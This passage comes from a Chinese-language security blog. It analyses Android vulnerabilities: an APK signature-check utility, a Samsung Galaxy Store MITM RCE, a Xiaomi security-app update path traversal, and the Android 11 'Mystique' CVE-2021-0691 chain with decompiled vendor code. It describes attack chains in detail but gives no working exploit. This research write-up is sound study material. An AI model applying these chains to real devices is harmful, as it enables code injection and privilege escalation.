class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 安全校验</span></span><br><span class="line"><span class="comment">* Created by LIUYONGKUI on 2016-04-21.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafetyUtils</span> &#123;</span><br><span class="line">    <span class="comment">/** install sucess */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SUCCESS</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** SIGNATURES_INVALIDATE */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SIGNATURES_INVALIDATE</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** SIGNATURES_NOT_SAME */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">VERIFY_SIGNATURES_FAIL</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** is needcheck */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">NEED_VERIFY_CERT</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * checkPagakgeSigns.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">checkPagakgeSign</span><span class="params">(Context context, String srcPluginFile)</span> &#123;</span><br><span class="line">        <span class="type">PackageInfo</span> <span class="variable">PackageInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">                                         .getPackageArchiveInfo(srcPluginFile, <span class="number">0</span>); <span class="comment">//Signature[] pluginSignatures = PackageInfo.signatures;</span></span><br><span class="line">        Signature[] pluginSignatures = PackageVerifyer.collectCertificates(srcPluginFile,</span><br><span class="line">                <span class="literal">false</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isDebugable</span> <span class="operator">=</span> (<span class="number">0</span> != (context.getApplicationInfo().flags &amp;</span><br><span class="line">            ApplicationInfo.FLAG_DEBUGGABLE));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pluginSignatures == <span class="literal">null</span>) &#123;</span><br><span class="line">            PaLog.e(<span class="string">&quot;签名验证失败&quot;</span>, srcPluginFile);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">File</span>(srcPluginFile).delete();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> SIGNATURES_INVALIDATE;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (NEED_VERIFY_CERT &amp;&amp; !isDebugable) &#123; <span class="comment">//可选步骤，验证APK证书是否和现在程序证书相同。</span></span><br><span class="line"></span><br><span class="line">            Signature[] mainSignatures = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">PackageInfo</span> <span class="variable">pkgInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">                                             .getPackageInfo(context.getPackageName(),</span><br><span class="line">                        PackageManager.GET_SIGNATURES);</span><br><span class="line">                mainSignatures = pkgInfo.signatures;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!PackageVerifyer.isSignaturesSame(mainSignatures,</span><br><span class="line">                        pluginSignatures)) &#123;</span><br><span class="line">                PaLog.e(<span class="string">&quot;升级包证书和旧版本证书不一致&quot;</span>, srcPluginFile);</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">File</span>(srcPluginFile).delete();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> VERIFY_SIGNATURES_FAIL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * checkPagakgeName</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> srcNewFile</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkPagakgeName</span><span class="params">(Context context, String srcNewFile)</span> &#123;</span><br><span class="line">        <span class="type">PackageInfo</span> <span class="variable">packageInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">                                         .getPackageArchiveInfo(srcNewFile,</span><br><span class="line">                PackageManager.GET_ACTIVITIES);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (packageInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> TextUtils.equals(context.getPackageName(),</span><br><span class="line">                packageInfo.packageName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * checkFile</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> aPath</span></span><br><span class="line"><span class="comment">    *            文件路径</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">    *            context</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkFile</span><span class="params">(String aPath, Context context)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">aFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(aPath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((aFile == <span class="literal">null</span>) || !aFile.exists()) &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;安装包已被恶意软件删除&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (context == <span class="literal">null</span>) &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;安装包异常&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="额外的漏洞"><a href="#额外的漏洞" class="headerlink" title="额外的漏洞"></a>额外的漏洞</h1><p>是漏洞，也算是不安全的开发方式吧。</p>
<h2 id="通过-MITM-的三星-Galaxy-应用商店-RCE"><a href="#通过-MITM-的三星-Galaxy-应用商店-RCE" class="headerlink" title="通过 MITM 的三星 Galaxy 应用商店 RCE"></a>通过 MITM 的三星 Galaxy 应用商店 RCE</h2><p>原文链接：<a target="_blank" rel="noopener" href="https://www.adyta.pt/en/noticias/news-1/">https://www.adyta.pt/en/noticias/news-1/</a></p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Galaxy Apps Store 检索一个特定于国家&#x2F;地区的 URL 以供商店使用。此请求有时会定期发生，或者在您第一次启动应用程序时或您的 MCC（移动国家代码）发生变化时发生。但是，此请求是使用 HTTP 而不是 HTTPS 发出的，这允许 MITM（中间人）攻击。</p>
<p>在这个 POST 请求中，设备发送有关设备状态的信息，例如：MCC、MNC、设备型号和语言。在响应中，将返回一个CountryURL 以供 Store 使用。CountryURL 包含 HTTP URL，但应用程序将在下一个请求中使用 HTTPS。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image3.png" alt="image3"></p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image1.png" alt="image1"></p>
<p>中间人</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image4.png" alt="image4"></p>
<h2 id="小米预装安全App漏洞"><a href="#小米预装安全App漏洞" class="headerlink" title="小米预装安全App漏洞"></a>小米预装安全App漏洞</h2><p>原文链接：<a target="_blank" rel="noopener" href="https://research.checkpoint.com/2019/vulnerability-in-xiaomi-pre-installed-security-app/">https://research.checkpoint.com/2019/vulnerability-in-xiaomi-pre-installed-security-app/</a></p>
<h3 id="1、Avast更新漏洞"><a href="#1、Avast更新漏洞" class="headerlink" title="1、Avast更新漏洞"></a>1、Avast更新漏洞</h3><p>安全APP使用Avast、AVL 和腾讯进行杀毒，默认情况下，将 Avast 设置为应用程序的安全扫描程序，应用程序通过将<code>avast-android-vps-v4-release.apk</code> APK 文件下载到 <code>Guard Provider</code> 的私有目录：<code>/data/data/com.miui.guardprovider/app_dex/vps_update*_&lt;timestamp&gt;*.apk</code> 来定期更新其病毒库。</p>
<p>但是，更新机制使用不安全的 HTTP 连接来下载此文件。</p>
<h3 id="2、AVL-更新路径遍历漏洞"><a href="#2、AVL-更新路径遍历漏洞" class="headerlink" title="2、AVL 更新路径遍历漏洞"></a>2、AVL 更新路径遍历漏洞</h3><p>一旦阻止与Avast服务器的连接，APP就会把默认的杀毒软件换成另一个–在这种情况下是AVL反病毒软件。</p>
<p>在AVL成为默认杀毒软件后，它将立即用其病毒数据库更新该应用。它通过请求一个配置文件（如<a target="_blank" rel="noopener" href="https://update.avlyun.sec.miui.com/avl_antiy/miuistd/siglib/20180704.cj.conf%EF%BC%89%E6%9D%A5%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%96%B0%E7%9A%84%E7%97%85%E6%AF%92%E7%AD%BE%E5%90%8D%E3%80%82%E8%BF%99%E4%B8%AA%60.conf%60%E6%96%87%E4%BB%B6%E6%98%AF%E7%BA%AF%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F%E7%9A%84%EF%BC%8C%E8%A1%A8%E6%98%8E%E6%9C%89%E6%96%B0%E7%AD%BE%E5%90%8D%E7%9A%84ZIP%E6%A1%A3%E6%A1%88%E7%9A%84URL%E3%80%81%E5%A4%A7%E5%B0%8F%E5%92%8CMD5%E5%93%88%E5%B8%8C%E5%80%BC%E3%80%82">https://update.avlyun.sec.miui.com/avl_antiy/miuistd/siglib/20180704.cj.conf）来检查是否存在新的病毒签名。这个`.conf`文件是纯文本格式的，表明有新签名的ZIP档案的URL、大小和MD5哈希值。</a></p>
<p>在处理完配置文件后，AVL会下载<code>read_update_url</code>字段中指示的zip文件，并将其解压到Guard Provider目录中。</p>
<p>MITM攻击者能够改变<code>.conf</code>文件的内容，因为它是通过非安全连接下载的，使用<code>is_new=0</code>来显示新的更新的存在，并提供URL链接到一个精心制作的ZIP文件。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/fig5.webp" alt="fig5"></p>
<p>AVL SDK还存在路径穿越漏洞，因此，攻击者能够使用精心制作的zip文件来覆盖应用程序沙盒中的任何文件。</p>
<p>因此，一个精心制作的APK，作为<code>.../.../app_dex/vps_update_20190205-124933.apk</code>条目附加到ZIP签名的存档中，将成功覆盖之前从Avast下载的更新，因为两个反病毒SDK组件在相同的沙盒中。</p>
<p>然后释放Avast的通信，并阻止AVL的通信，直到APP再次选择Avast作为活动的反病毒软件。由于Guard Provider对Avast更新的签名文件的校验只在下载时进行，在运行时就不再检查，恶意APK将被加载执行。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-07-04T12:34:01.000Z" title="2022/7/4 20:34:01">2022-07-04</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-07-30T06:58:15.252Z" title="2022/7/30 14:58:15">2022-07-30</time></span><span class="level-item">24 minutes read (About 3542 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/">Android 11 魔形女漏洞</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>可以参考京东的<a target="_blank" rel="noopener" href="https://dawnslab.jd.com/mystique-paper/mystique-paper.pdf">白皮书</a>，漏洞倒是不难理解，本来是想写exp的，但是有点累🥱，想想还是先整理整理文档，找找感觉吧。</p>
<h1 id="1-CVE-2021-0691"><a href="#1-CVE-2021-0691" class="headerlink" title="1. CVE-2021-0691"></a>1. CVE-2021-0691</h1><p>这是一个AOSP的漏洞，对于正常的<code>system_app</code>的<code>Selinux</code>策略来讲，不应该具备写<code>/data/app</code>目录的权限，但是Android 11 中却加入了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">index e5d7d18..1432017 100644</span><br><span class="line">--- a/private/system_app.te</span><br><span class="line">+++ b/private/system_app.te</span><br><span class="line">@@ -69,6 +69,9 @@</span><br><span class="line"><span class="comment"># Settings need to access app name and icon from asec</span></span><br><span class="line">allow system_app asec_apk_file:file r_file_perms;</span><br><span class="line">+# Allow system_app (adb data loader) to write data to /data/incremental</span><br><span class="line">+allow system_app apk_data_file:file write;</span><br><span class="line">+</span><br><span class="line"><span class="comment"># Allow system apps (like Settings) to interact with statsd</span></span><br><span class="line">binder_call(system_app, statsd)</span><br></pre></td></tr></table></figure>

<p><code>apk_data_file</code>指的是<code>/data/app</code>，这里存放的是应用程序的代码文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">a70q:/data/app/com.unionpay.tsmservice-0bfCG-Zd90PuEwegtR8UzQ== # ls -lR</span><br><span class="line">.:</span><br><span class="line">total 6184</span><br><span class="line">-rw-r--r-- 1 system system 6308538 2021-01-01 01:22 base.apk</span><br><span class="line">drwxr-xr-x 3 system system 4096 2021-01-01 01:22 lib</span><br><span class="line">drwxrwx--x 3 system install 4096 2021-01-01 01:22 oat</span><br><span class="line">./lib:</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 system system 4096 2021-01-01 01:22 arm64</span><br><span class="line">./lib/arm64:</span><br><span class="line">total 2092</span><br><span class="line">-rwxr-xr-x 1 system system 185816 1979-11-30 00:00 libentryexpro.so</span><br><span class="line">-rwxr-xr-x 1 system system 723744 1979-11-30 00:00 libuptsmaddon.so</span><br><span class="line">-rwxr-xr-x 1 system system 1216480 1979-11-30 00:00 libuptsmservice.so</span><br><span class="line">./oat:</span><br><span class="line">total 8</span><br><span class="line">drwxrwx--x 2 system install 4096 2021-01-01 01:22 arm64</span><br><span class="line">./oat/arm64:</span><br><span class="line">total 2588</span><br><span class="line">-rw-r--r-- 1 system all_a192 28672 2021-01-01 01:22 base.art</span><br><span class="line">-rw-r--r-- 1 system all_a192 87712 2021-01-01 01:22 base.odex</span><br><span class="line">-rw-r--r-- 1 system all_a192 2517132 2021-01-01 01:22 base.vdex</span><br></pre></td></tr></table></figure>

<p>这个改动意味着，拥有<code>system_app uid</code> 的程序能够去覆写其他APP的代码文件，包括<code>so</code>和<code>base.apk</code>，实现代码注入。这个代码的引入是因为<code>incremental install</code>功能，这个功能用于大小超过1 GB的应用程序的安装，在<code>Android 11 Preview 1</code>中，<code>AdbDataLoader</code>被加入以支持<code>incremental install</code>，因此，<code>system_app</code>的策略被修改了。虽然后来经过了一些变动（<code>AdbDataLoader</code>被移除了），但是这个策略却被保留了下来。</p>
<h1 id="2-漏洞利用-静态分析"><a href="#2-漏洞利用-静态分析" class="headerlink" title="2. 漏洞利用 - 静态分析"></a>2. 漏洞利用 - 静态分析</h1><p>为了利用第一步中发现的漏洞，做了一些静态分析的工作，其实，利用思路也很简单，就是从系统应用程序中，找到一个bug，这个bug可以实现任意文件写。</p>
<p>这个问题可以转化为<code>Java</code>语言的<code>source-sink</code>类型的<code>data-flow</code>污点分析问题，可以使用基于<code>Soot</code>的<a target="_blank" rel="noopener" href="https://github.com/Sable/heros"><code>IFDS</code></a>（<code>Inter-procedure</code>， <code>Finite</code>， <code>Distributive</code>）框架进行解决。</p>
<p>对于任一污点分析问题，我们首先应该定义清楚<code>source</code>和<code>sink</code>，对于<code>source</code>的定义如下：</p>
<ol>
<li>导出的<code>Activity</code>、<code>Service</code>、<code>Broadcast Receiver</code>或<code>Content Provider</code>中接收的<code>Intent</code>；</li>
<li>可控制的输入流中接收的数据，如<code>socket</code>；</li>
<li>可控制的位置处接收的文件，如攻击者包数据和全局可读&#x2F;写的位置。</li>
</ol>
<p><code>sink</code>的定义如下：</p>
<ol>
<li>文件输出流；</li>
<li>动态代码加载功能；</li>
<li>命令执行功能。</li>
</ol>
<p>剩下的就是去优化了，京东是使用了自己的分析工具，叫<code>Star Watcher</code>，基于<code>FlowDroid</code>。这个工具的特点是对上下文、流、字段和对象敏感，工作在过程间控制流图上，为了比其他工具好，在设计时考虑了以下几点：</p>
<ol>
<li>构建了一个完整的调用图：一个完整的调用图是所有后续分析的基础，如数据流和污点分析。目前最先进的<code>SPARK</code> <code>Java</code>指针分析，会漏掉某些分配节点，如：</li>
</ol>
<p><strong>例1</strong> </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sample</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">target</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">for</span>(Helper helper: helpers)</span><br><span class="line">			helper.handle();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Set&lt;Helper&gt; helpers;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Sample</span> <span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.helpers = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">		<span class="built_in">this</span>.helpers.add(<span class="keyword">new</span> <span class="title class_">HelperImplA</span>());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelperImplA</span> <span class="keyword">implements</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;wtf&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelperImplB</span> <span class="keyword">implements</span> <span class="title class_">Helper</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Spark</code>指针分析不能处理这种情况，即元素被放入容器，然后被取出，它不能在<code>handler.handle()</code>的调用位置决定<code>Helper</code>的类型。因此，<code>handler.handle</code>的调用边在调用图中缺失。如果<code>handle</code>函数中存在可能的数据流，就会导致遗漏。</p>
<p><strong>例2</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AParcelable</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span> &#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResume</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">AParcelable</span> <span class="variable">p</span> <span class="operator">=</span> getIntent().getParcelableExtra(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">		p.func();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于例2，<code>AParcelable</code>类的分配是在解<code>parcelable</code>时在库的代码中完成的，这超出了分析范围。在这个例子中，<code>Spark</code>也未能正确地检测到这个变量的分配节点，从而导致调用图中目标类的调用边丢失。</p>
<p>为了解决这个问题，京东使用的办法是结合CHA算法，通过CHA算法，将可能丢失的边添加到调用图中，实验证明是有效的。</p>
<p>组件入口点改变也会影响到调用图的完整性，京东的解决方法是，在分析的过程中，建立一个假的<code>main</code>方法，调用所有组件的生命周期方法来模拟Android框架的行为。比如说，在API 29中增加了一个新的<code>Content Provider</code>的函数<code>call</code>的变体。</p>
<ol start="2">
<li><p>通过舍弃不相关的数据流优化执行性能，IFDS算法本质上是一种定点算法。它需要保留与每个语句相关的数据事实，以决定我们是否应该停止。IFDS算法的工作对象是过程间的CFG，并将流函数分为四种类型：</p>
</li>
<li><p>NormalFlowFuntions </p>
</li>
<li><p>CallFlowFunctions</p>
</li>
<li><p>ReturnFlowFunctions</p>
</li>
<li><p>CallToReturnFlowFunctions</p>
</li>
</ol>
<p>对于污点的实例，<code>CallFlow</code>负责决定是否将其传递给调用者函数，正常情况下，如果调用者函数是一个实例调用（<code>virtual</code>函数），IFDS将传递这个污点实例，并记录对应语句创建的&#x2F;缓存的边，因为污点隐式地与<code>this</code>实例相关。但是，如果实例字段从未被读或写，我们就不需要传递它。所以这一点是可以进行优化的。</p>
<p>通过对<code>icfg</code>进行快速的预检查和缓存实例分析，可以解决原来算法的OOM错误，并提高运行速度。</p>
<h1 id="3-厂商-bug"><a href="#3-厂商-bug" class="headerlink" title="3. 厂商 bug"></a>3. 厂商 bug</h1><h2 id="3-1-Camera-和-FilterProvider-中的权限提升"><a href="#3-1-Camera-和-FilterProvider-中的权限提升" class="headerlink" title="3.1 Camera 和 FilterProvider 中的权限提升"></a>3.1 Camera 和 FilterProvider 中的权限提升</h2><p>漏洞编号：CVE-2021-25510、CVE-2021-25511，并在2021年12月的三星安全公告中修复。</p>
<p>当一个具有<code>com.sec.android.camera.permission.USE_EFFECT_FILTER</code>权限当包被安装后，<code>FilterProvider</code>自动通过其注册的广播接收器收到通知，并将其识别为一个<code>CAMERA EFFECT FILTER</code>。目标包中的文件被提取到<code>/data/DownFilters/Lib64/</code>，函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.android.provider.filterprovider;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FilterInstaller</span> &#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">private</span> String <span class="title function_">copyFileFromAssets</span><span class="params">(AssetManager arg10, String arg11, String arg12, <span class="type">boolean</span> arg13)</span> &#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">installLibFilter</span><span class="params">(Context arg11, String arg12)</span> &#123;</span><br><span class="line">		Resources v11_1;</span><br><span class="line">		Log.d(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;install filter for Lib&quot;</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			v11_1 = arg11.getPackageManager().getResourcesForApplication(arg12);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(PackageManager.NameNotFoundException v11) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;installLibFilter, resource error, package name : &quot;</span> + arg12 + <span class="string">&quot;, exception : &quot;</span> + v11.toString());</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">AssetManager</span> <span class="variable">v12</span> <span class="operator">=</span> v11_1.getAssets();</span><br><span class="line">		String[] v2 = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			v2 = v12.list(<span class="string">&quot;so&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(IOException v3) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;installLibFilter, asset lib list exception : &quot;</span> + v3.toString());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(v2.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;asset lib list length is small than 0&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> <span class="variable">v3_1</span> <span class="operator">=</span> v2.length;</span><br><span class="line">		<span class="type">int</span> v4;</span><br><span class="line">		<span class="keyword">for</span>(v4 = <span class="number">0</span>; v4 &lt; v3_1; ++v4) &#123;</span><br><span class="line">			<span class="type">String</span> <span class="variable">v5</span> <span class="operator">=</span> v2[v4];</span><br><span class="line">			Log.d(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;filterFile : &quot;</span> + v5);</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">this</span>.storeLibFilters(v12, v11_1, v5, v5.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">0</span>]) == -<span class="number">1L</span> &amp;&amp; (v5.endsWith(<span class="string">&quot;.so&quot;</span>))) &#123;</span><br><span class="line">				Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;storeLibFilters fail&quot;</span>);</span><br><span class="line">			